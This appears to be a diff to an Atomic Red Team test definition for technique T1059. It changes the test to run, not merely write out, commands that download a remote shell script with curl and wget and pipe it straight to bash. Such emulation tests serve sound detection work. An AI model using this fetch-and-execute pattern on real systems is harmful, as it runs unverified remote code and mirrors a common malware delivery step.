@@ -11,9 +11,10 @@ atomic_tests:
   supported_platforms:
     - macos
     - linux
-
+  output:
+    file: None
   executor:
     name: sh
     command: |
-      echo 'bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"' >> /opt/AtomicRedTeam/single.sh
-      echo 'bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"' >> /opt/AtomicRedTeam/single.sh
+      bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
+      bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
